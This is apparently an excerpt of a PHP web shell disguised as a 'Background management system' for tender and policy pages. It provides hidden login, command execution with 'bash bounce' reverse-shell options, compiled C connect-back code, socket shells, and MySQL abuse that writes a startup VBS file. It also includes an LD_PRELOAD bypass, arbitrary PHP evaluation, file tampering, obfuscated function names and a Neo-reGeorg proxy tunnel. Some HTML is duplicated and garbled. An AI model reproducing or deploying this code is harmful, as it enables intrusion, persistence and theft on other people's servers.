...
EOF;
	...
	public function htmlLogin () {
		self :: htmlOut ( "<html lang='en'><head><title>Background management system</title>" );
		self::loginCss();
...
<body>
    <div class="main">
        <div class="left">
            <div class="title">Background management system</div>
            <nav class="nav">
                <ul>
                    <li>
                        <a href="?">
                    ...
                    <li>
                        ...
                        <ul class="sen-nav">
                            ...
                            <li><a href="?action=zcjd">Policy Interpretation</a></li>
                        </ul>
                    </li>
                    ...
                    <li>
                        ...
                        <ul class="sen-nav">
                            <li><a href="?action=flyj">Legal basis</a></li>
                            <li><a href="?action=bszn">Guidelines</a></li>
                            <li><a href="?action=yjzj">Comments Solicitation</a></li>
                        </ul>
                    </li>
                    <li><a id="more" href="javascript:;" class="havanexta" data-rel="more">
                        ...
                        <ul class="sen-nav">
                            <li><a href="?action=bsjs">Tender Search</a></li>
                            <li><a href="?action=sxxc">Ideological Advocacy</a></li>
                            <li><a href="?action=bsxz">Tender Download</a></li>
                            <li><a href="?action=zxsb">Online declaration</a></li>
                        </ul>
                    </li>
...
class Login {
	...
	public function checkLogin ($password) {
		$secret = 'gyWpLHKN' ; // password YZVlYfiI
	...
	public function logout () {
		...
		HtmlOutput :: tips ( "You are logged out, bye!" , "?" );
	}
}
...
<div class="actall">Call Tool<select name="use" >
...
END;
		if ((!empty($GLOBALS['_POST']['bound_1'])) && (!empty($GLOBALS['_POST']['bound_2']))) {
			...
			if ($GLOBALS['_POST']['use'] == '1') {
				...
				$result     .= self :: $fileClass -> writeFile ( '/tmp/dyAeLWNJ' , 'wb' , Decrypt :: run ( $pl_code )) ? 'Creating /tmp/dyAeLWNJ succeeded<br>' : 'Creating /tmp /dyAeLWNJ failed<br>' ;
				...
				$result .= 'Mothership call completed, please check the communication result. ' ;
			}
			if ($GLOBALS['_POST']['use'] == '2') {
				$c_code = StringHandler::getCode('gai');
				$result .= self :: $fileClass -> writeFile ( '/tmp/dyAeLWNJ.c' , 'wb' , Decrypt :: run ( $c_code )) ? 'Creating /tmp/dyAeLWNJ.c succeeded<br>' : 'Failed to create /tmp/dyAeLWNJ.c<br>' ;
				Foundation::DeMarcia('gcc -o /tmp/dyAeLWNJ /tmp/dyAeLWNJ.c');
				@unlink('/tmp/dyAeLWNJ.c');
				$result .= Foundation :: DeMarcia ( '/tmp/dyAeLWNJ ' . $target_ip . ' ' . $target_port . ' &' ) ? 'nc -vv -l ' . $target_port : 'Failed to execute command' ;
			}
			if ($GLOBALS['_POST']['use'] == '3') {
				if (!extension_loaded('sockets')) {
					if ($system == 'WIN') {
						@dl ( 'php_sockets.dll' ) or self :: $htmlClass -> tips ( "Missing related modules" , '/?action=flyj' );
					} else {
						@dl ( 'sockets.so' ) or self :: $htmlClass -> tips ( "missing module" , '/?action=flyj' );
					}
				}
				if ($system == "WIN") {
				...
				if (($sock = $a(AF_INET , SOCK_STREAM , $proto)) < 0) {
					die ( "Failed to establish communication with the main ship" );
				}
				if (($ret = socket_connect($sock , $host , $target_port)) < 0) {
					die ( "Communication establishment failed" );
				} else {
			...
			if ($GLOBALS['_POST']['use'] == '4') {
				...
				if (!$fp) {
					$result .= "Unable to open socket connection" ;
				} else {
	...
	public function moneyManage () {
		...
		if ($flag) {
			if ($conn = mysql_connect($target_host . ':' . $target_port , $target_user , $target_pass)) {
				...
				self :: $htmlClass -> tips ( 'Failed to connect to MYSQL' , '?action=sjcx' );
			}
		}
		...
		if (!empty($GLOBALS['_POST']['downfile'])) {
			...
			if ($money_return = @$ai($query , $conn)) {
				...
				if ($down_code) {
					...
					self :: $htmlClass -> tips ( "File query failed, please check mysql secure-file-priv configuration" , "?action=sjcx&type=d" );
				}
			} else  self :: $htmlClass -> tips ( "File download failed" , "?action=sjcx&type=d" );
		}
...
END;
		if ($type == 'u') {
			$uppath = 'C:/Documents and Settings/All Users/Start Menu/Programs/Startup/exp.vbs' ;
			if (!empty($GLOBALS['_POST']['uppath'])) {
				...
				if (@$ai($query , $conn)) {
					...
					if (@$ai($query , $conn)) {
						...
						$message = @ $ai ( $query , $conn ) ? 'Uploaded file succeeded' : 'Uploaded file failed' ;
					} else {
						$message = 'Failed to insert into temporary table' ;
					}
					@$ai('Drop TABLE IF EXISTS ' . $rand_str_2 . ';' , $conn);
				} else  $message = 'Failed to create temp table' ;
			}
			$result .= <<<END
...
END;
			...
			if (!empty($GLOBALS['_POST']['content'])) {
				...
				if ($sql_result = @$ai($msql , $conn)) {
					$message = 'Action executed successfully<br>' ;
					$k       = 0;
...
EOF;
		...
		if (!$type && !$cpu && !$content) {
			$result .= <<<EOF
<span class="title">C program source code</span>
<textarea readonly>
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
		...
		if ($type && $cpu) {
			if (!@file_exists($so_path)) {
				if ($cpu == '1') {
					...
					$file_code = '';
				}
			...
			$a      = getenv("CDL");
			$b      = getenv("LD_PRELOAD");
			$result .= "<div class='main-content'><div class='result'><span>Execute command</span><div class='tip'>$command_line</div></div> <div class='result' ><span>command environment variables</span><div class='tip'>$a</div></div><div class='result'><span>so file environment variable</span><div class='tip'>$b</div></div>" ;
...
EOF;
		...
		$info    = [
			[ "Server time/Beijing time" , date ( "Y year m month d day h:i:s" , time ()) . " / " . gmdate ( "Y year n month j day H:i :s" , time () + 8 * 3600 )] ,
			...
			[ "Server OS (text encoding)" , PHP_OS . " (" . $_SERVER [ 'HTTP_ACCEPT_LANGUAGE' ] . ")" ] ,
			[ "Server Interpreter Engine" , $_SERVER [ 'SERVER_SOFTWARE' ]] ,
			[ "your IP" , getenv ( 'REMOTE_ADDR' )] ,
			[ "PHP running mode (version)" , strtoupper ( php_sapi_name ()) . "(" . PHP_VERSION . ") / safemode:" . self :: getCfg ( "safemode" )] ,
			[ "Server Administrator" , $adminmail ] ,
			[ "path to this file" , __FILE__] ,
			[ "Allow file opening with URL<br>[allow_url_fopen]" , self :: getCfg ( "allow_url_fopen" )] ,
			[ "Allow dynamic loading of linked libraries<br>[enable_dl]" , self :: getCfg ( "enable_dl" )] ,
			[ "Display error messages<br>[display_errors]" , self :: getCfg ( "display_errors" )] ,
			[ "Custom Globals<br>[register_globals]" , self :: getCfg ( "register_globals" )] ,
			[ "Auto string escape<br>[magic_quotes_gpc]" , self :: getCfg ( "magic_quotes_gpc" )] ,
			[ "Maximum memory usage<br>[memory_limit]" , self :: getCfg ( "memory_limit" )] ,
			[ "POST max bytes<br>[post_max_size]" , self :: getCfg ( "post_max_size" )] ,
			[ "Maximum upload allowed<br>[upload_max_filesize]" , $upsize ] ,
			[ "Maximum program execution time<br>[max_execution_time]" , self :: getCfg ( "max_execution_time" ) . "seconds" ] ,
			[ "Disable Functions<br>[disable_functions]" , $dis_func ] ,
			[ "Program info function<br>[phpinfo()]" , $phpinfo ] ,
			[ "Currently there is free space<br>[diskfreespace]" , intval ( diskfreespace ( "." ) / ( 1024 * 1024 )) . 'Mb' ] ,
			[ "GZ archive support<br>[zlib]" , self :: funAlive ( "gzclose" )] ,
			[ "ZIP archive support<br>[ZipArchive(php_zip)]" , self :: funAlive ( "zip_open" )] ,
			[ "IMAP Email System" , self :: funAlive ( "imap_close" )] ,
			["XML解析" , self::funAlive("xml_set_object")] ,
			[ "FTP login" , self :: funAlive ( "ftp_login" )] ,
			["Session支持" , self::funAlive("session_start")] ,
			["Socket支持" , self::funAlive("fsockopen")] ,
			[ "MySQL database" , self :: funAlive ( "mysql_close" )] ,
			[ "MSSQL Database" , self :: funAlive ( "mssql_close" )] ,
			[ "Postgre SQL Database" , self :: funAlive ( "pg_close" )] ,
			["SQLite数据库" , self::funAlive("sqlite_close")] ,
			[ "Oracle Database" , self :: funAlive ( "ora_close" )] ,
			[ "Oracle 8 Database" , self :: funAlive ( "OCILogOff" )] ,
			[ "SyBase Database" , self :: funAlive ( "sybase_close" )] ,
			[ "Hyperwave Database" , self :: funAlive ( "hw_close" )] ,
			[ "InforMix Database" , self :: funAlive ( "ifx_close" )] ,
			[ "FilePro Database" , self :: funAlive ( "filepro_fieldcount" )] ,
			["DBA/DBM连接" , self::funAlive("dba_close") . "&nbsp;/&nbsp;" . self::funAlive("dbmclose")] ,
			["ODBC/dBASE连接" , self::funAlive("odbc_close") . "&nbsp;/&nbsp;" . self::funAlive("dbase_close")] ,
			[ "PREL Compatible Syntax<br>[PCRE]" , self :: funAlive ( "preg_match" )] ,
			["PDF支持" , self::funAlive("pdf_close")] ,
			[ "Graphics Processing<br>[GD Library]" , self :: funAlive ( "imageline" )] ,
			[ "SNMP Network Management Protocol" , self :: funAlive ( "snmpget" )] ,
		];
		$result  .= '<table>';
...
<form method="POST"name="gform"id="gform"action="?action=zxft"><div class="input-box"><span class="input-text">input content</ span><input type="text"name="content"id="content"value="{$cmd}"style="width:464px;"><select onchange='return cHandle(options[selectedIndex].value )'><option value="0"selected>Complete content</option><option value="1">View IP</option><option value="2">View configuration</option><option value= "3">View Kernel</option><option value="4">Copy Files</option><option value="5">View Process</option><option value="6">Add Management</option> option><option value="7">User list</option><option value="8">view network</option><option value="9">view version</option><option value="10">compile file</option><option value="11">change attribute</option><option value="12">bash bounce</option><option value="13">linux bounce</option></select><input type="submit"value="send" onclick ="SubmitUrl();"></div><div class="input-box"><span class="input-text2">return result</span><textarea name="show">{$res} </textarea></div></form>>bash反弹</option><option value="13">linux反弹</option></select><input type="submit"value="发送"onclick="SubmitUrl();"></div><div class="input-box"><span class="input-text2">返回结果</span><textarea name="show">{$res}</textarea></div></form>>bash反弹</option><option value="13">linux反弹</option></select><input type="submit"value="发送"onclick="SubmitUrl();"></div><div class="input-box"><span class="input-text2">返回结果</span><textarea name="show">{$res}</textarea></div></form>
END;
		return $result;
	}
...
<form method="POST" id="sendcode" ><div class="der">Write your wish on the left, and there will be a magician on the right to help you realize it~</div><div style="font- size: 0"><textarea COLS="120" ROWS="35" name="content" id="content">$php_code</textarea><input type="submit" value=">>" onclick=" submitUrl();"><div class="result">
EOF;
		if (!empty($GLOBALS['_POST']['content'])) {
...
<div class="sug-box"><div class="sug">This module can use the tools used for cutting vegetables, weapons from Demacian ants and other management terminals to connect</div><div class="sug -content"><div><div>Connection address:</div><span class="active">http://website.com/script.php?action=cxk&e=cmVfc19ldF9hX2xpX2Fz</span></div> <div><div>Password:</div><span class="active">singdancerapbasketball</span></div><div><div>Connection configuration: </div><span class="active"> Cookie:PHPSESSIDS=5dce171e2fab0814d67170153804f937</span></div></div></div>
EOF;
		return $result;
	}
	...
	public static function sword () {
		...
		$f = $e [ 3 ]. $and [ 1 ]. $and [ 5 ] [ 1 ]. $and [ 2 ] [ 0 ]. $and [ 0 ] [ 0 ]. $e [ 2 ] [ 1 ];
...
class FileHandler {
	...
	function __construct () {
		$this -> msg = [ "0" => "Save successfully" , "1" => "Save failed" , "2" => "Upload successful" , "3" => "Upload failed" , "4" => "Modification succeeded" , "5" => "Modification failed" , "6" => "Deletion successful" , "7" => "Deletion failed" ];
	...
	public function downloadFile () {
		...
		if (!@ file_exists ( $file )) HtmlOutput :: message ( 'The downloaded file does not exist' );
		...
		if ($type == 'e') {
			...
			function  num_bitunit ( $num ) {
				...
				for ($key = 0; $key < count($bitunit); $key ++) {
					if ( $num >= pow ( 2 , 10 * $key ) - 1 ) { //1023B will be displayed as 1KB
			...
			if (is_array($array)) {
				...
				if ($faisunZIP->startFile("$inver")) {
					...
					return  "Compression is complete, a total of $filenum files are added. <a href='$inver'>Click to download $inver (" . num_bitunit ( filesize ( "$inver" )) . ")</a>" ;
				} else {
					return  "$inver cannot be written, please check if the path or permissions are correct." ;
				}
			} else {
				return  "No selected file or directory." ;
			}
		}
		$i = 0;
		while ($i < $count) {
			...
			switch ($type) {
				...
				case "b" :
					...
					break;
				case "c" :
					if (! preg_match ( "/^[0-7]{4}$/i" , $inver )) return  'property value error' ;
					$newmode = base_convert($inver , 8 , 10);
					@chmod($REAL_DIR . $array[$i] , $newmode);
					$msg = 'property modified to' . $inver ;
					break;
				case "d" :
					@touch($array[$i] , strtotime($inver));
					$msg = 'modified time is' . $inver ;
					break;
			}
			$i ++;
		}
		return  'Selected file' . $msg . 'Done' ;
	}
...
<script language="javascript">
	function rusurechk(msg,url){smsg = "File name: [" + msg + "] \\nPlease output the new file name:";re = prompt(smsg,msg);if (re){url = url + base64encode(re);window.location = url;}}
	function rusuredel(msg,url){smsg = "Are you sure you want to delete [" + msg + "]?";if(confirm(smsg)){URL = url + base64encode(msg);window.location = url;}}
	...
	function CheckDate(msg,gourl){smsg = "Current file time: [" + msg + "]";re = prompt(smsg,msg);if(re){var url = gourl + re;var reg = /^ (\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}) :(\\d{1,2}):(\\d{1,2})$/;var r = re.match(reg);if(r==null){alert('The date format is incorrect !Format: yyyy-mm-dd hh:mm:ss');return false;}else{document.getElementById('select_all').value = gourl; document.getElementById('inver').value = re; document. getElementById('fileall').submit();}}}
...
EOF;
		...
		$result       .= <<<EOF
</form><form method="POST" name="type" id="fileall" action="?action=wjdc&path=$path_1"><table width="100%" border=0><tr><th >File Path</th><th>File Properties</th><th>($current_user)User|Group</th><th>Modified Time</th><th>File Size</th><th >Operation</th></tr>
EOF;
		while ($dirs = @$dir->read()) {
...
EOF;
		...
		$result .= <<<END
</table><div> <input type="hidden" id="select_all" name="type" value="undefined"><input type="hidden" id="inver" name="inver" value=" undefined"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form);"> <input type="button" class="small-btn" value="copy " onclick="SubmitUrl('Copy the selected file to the path: ','{$REAL_DIR}','a');return false;"><input type="button" class="small-btn" value=" Delete" onclick="Delok('Selected file','b');return false;"><input type="button" class="small-btn" value="Attribute" onclick="SubmitUrl('Modify all The selected file attribute value is: ','0666','c');return false;"><input type="button" class="small-btn" value="time" onclick="CheckDate('{$Filetime}','d');return false;" ><input type="button" class="small-btn" value="Package" onclick="SubmitUrl('Package and download the selected file download name: ','{$_SERVER['SERVER_NAME']}.zip ','e');return false;">directory(<span class="num">{$NUM_D}</span>) / file(<span class="num">{$NUM_F}</span> )</div></form></div>onclick="SubmitUrl('Package and download the selected file download name: ','{$_SERVER['SERVER_NAME']}.zip','e');return false;">Directory(<span class="num ">{$NUM_D}</span>) / file(<span class="num">{$NUM_F}</span>)</div></form></div>onclick="SubmitUrl('Package and download the selected file download name: ','{$_SERVER['SERVER_NAME']}.zip','e');return false;">Directory(<span class="num ">{$NUM_D}</span>) / file(<span class="num">{$NUM_F}</span>)</div></form></div>
END;
		return $result;
	}
...
EOF;
		...
		if (!empty($type) && $type == '2') {
			...
			if (@ file_exists ( $this -> p )) HtmlOutput :: message ( 'Found a file with the same name in the directory' , 'echo' );
...
EOF;
		...
		$result .= "<form method='POST'><div>" . $this -> p . ' The property is: ' ;
		if (is_dir($this->p)) {
	...
	public function startUnZip () {
		...
		if ($zip->open($this->p) !== true) {
			return  'Sorry! The archive cannot be opened or corrupted' ;
		}
		$zip->extractTo($to_dir);
		$zip->close();
		return  'The decompression is complete!    <a href="?action=wjdc&path=' . base64_encode ( urlencode ( $to_dir )) . '">Go to the decompression directory</a>   <a href="javascript: history.go(-1);">return</a>' ;
	}
...
END;
		if ((!empty($GLOBALS['_POST']['target'])) && (!empty($GLOBALS['_POST']['dest']))) {
			...
			if (!$contents) {
				HtmlOutput :: tips ( 'Unable to read the data to be downloaded' , '?action=bsxz' );
			} else {
				$content = $this -> writeFile ( Decrypt :: run ( $GLOBALS [ '_POST' ][ 'dest' ]) , 'wb' , $contents ) ? 'Successful download file' : 'Failed to download file' ;
...
<div class="sug-box"><div class="sug">This function provides socket proxy service, and the module is based on <a href="https://github.com/L-codes/Neo-reGeorg">Neo -reGeorg</a><br>is a socket proxy service refactored on the basis of regeorg</div><div class="sug-content">How to use:</div><div class="active"> python3 noereg.py -k reg3uVMc -u http://website.com/script.php?action=socket --cookie "PHPSESSIDS=5dce171e2fab0814d67170153804f937" --skip -p 33344</div><div class="sug"> After the Python side service is enabled, a listening port will be started locally. At this time, the proxy software can be used to proxy the traffic to the local port, including but not limited to proxychains, proxifier, browser proxy plug-ins, upstream proxy of packet capture software, etc.</ div><div class="sug">For more usage methods, please go to the Neo-reGeorg project to view <div></div>
EOF;
		return $result;
	}
